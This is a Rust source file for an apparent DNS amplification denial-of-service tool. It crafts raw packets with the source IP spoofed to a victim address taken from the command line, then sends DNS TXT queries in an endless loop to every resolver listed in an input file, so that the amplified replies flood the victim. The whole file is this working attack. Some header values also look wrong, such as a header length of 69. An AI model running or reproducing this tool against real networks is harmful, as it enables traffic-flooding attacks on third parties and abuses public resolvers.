mod interface;

use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::net::Ipv4Addr;
use std::path::Path;
use pnet::datalink;
use pnet::datalink::{Channel, MacAddr, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::udp::MutableUdpPacket;
use rand::Rng;

use interface::resolv;

static UDP_DNS_QUERY_PAYLOAD: [u8; 15] = [
    0x06, b'g', b'o', b'o', b'g', b'l', b'e',
    0x02, b'i', b't', // TLD
    0x00, //
    0x00, 0x10, // Q TYPE (request TXT records)
    0x00, 0x01 // Q CLASS
];
const ETHERNET_HEADER_LEN: usize = 14;
const IPV4_HEADER_LEN: usize = 20;

const UDP_HEADER_LEN: usize = 8;
const UDP_DNS_QUERY_HEADER_LEN: usize = 12;
const UDP_DNS_QUERY_PAYLOAD_LEN: usize = 15;

fn lines_from_file(filename: impl AsRef<Path>) -> Vec<String> {
    let file = File::open(filename).expect("no such file");
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .collect()
}

fn set_eth_header_at_packet(packet: &mut [u8], source_mac_address: MacAddr, destination_mac_address: MacAddr) {
    let mut eth_header = MutableEthernetPacket::new(&mut packet[..ETHERNET_HEADER_LEN]).unwrap();
    eth_header.set_source(source_mac_address);
    eth_header.set_destination(destination_mac_address);
    eth_header.set_ethertype(EtherTypes::Ipv4);

}

fn set_ip_header_at_packet(packet: &mut [u8], source_ip_address: Ipv4Addr, destination_ip_address: Ipv4Addr) {

    let mut ip_header = MutableIpv4Packet::new(
        &mut packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN+IPV4_HEADER_LEN)]
    ).unwrap();
    ip_header.set_header_length(69);
    ip_header.set_total_length(89);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Udp);
    ip_header.set_source(source_ip_address);
    ip_header.set_destination(destination_ip_address);
    ip_header.set_ttl(255);
    ip_header.set_version(4);
    ip_header.set_flags(0x00);
    let checksum = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(checksum);
}

fn set_udp_header_and_payload_at_packet(packet: &mut [u8]) {

    let mut udp_header = MutableUdpPacket::new(
        &mut packet[ETHERNET_HEADER_LEN+IPV4_HEADER_LEN..]
    ).unwrap();

    udp_header.set_source(rand::random::<u16>());
    udp_header.set_destination(53);

    let mut dns_query: Vec<u8> = Vec::new();
    {
        dns_query.extend_from_slice(&[
            0xAB, 0xCD, 0x01, 0x00,
            0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00 // DNS Query header
        ]);

        dns_query.extend_from_slice(&UDP_DNS_QUERY_PAYLOAD); // DNS Query payload
    }

    udp_header.set_payload(&dns_query);
    udp_header.set_length(35);

}

fn main() {
    let args: Vec<String> = env::args().collect();

    let interface_name = args[1].parse::<String>().unwrap();
    let target_ip_address = args[2].parse::<String>().unwrap();
    let amp_txt_file_path = args[3].parse::<String>().unwrap();

    let amp_txt_file_vec = lines_from_file(amp_txt_file_path.as_str());

    let interface_names_match =
        |iface: &NetworkInterface| iface.name == interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
        .filter(interface_names_match)
        .next()
        .unwrap();

    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error happened {}", e),
    };
    let default_gateway_for_interface = resolv::get_default_gateway_ip_address_for_interface(
        interface_name.as_str()
    ).unwrap();

    let default_gateway_mac_address = resolv::get_default_gateway_mac_address(
        &interface, default_gateway_for_interface
    ).unwrap();

    println!("{:#?}", default_gateway_mac_address);

    loop {
        for destination_ip_address in amp_txt_file_vec.iter() {
            let mut packet = [
                0u8; ETHERNET_HEADER_LEN + IPV4_HEADER_LEN + UDP_HEADER_LEN + UDP_DNS_QUERY_HEADER_LEN + UDP_DNS_QUERY_PAYLOAD_LEN
            ];

            set_eth_header_at_packet(
                &mut packet,
                interface.mac.unwrap(),
                default_gateway_mac_address
            );

            set_ip_header_at_packet(
                &mut packet,
                target_ip_address.parse().unwrap(),
                destination_ip_address.parse().unwrap(),
            );
            set_udp_header_and_payload_at_packet(&mut packet);
            tx.send_to(&packet, None);
        }
    }
}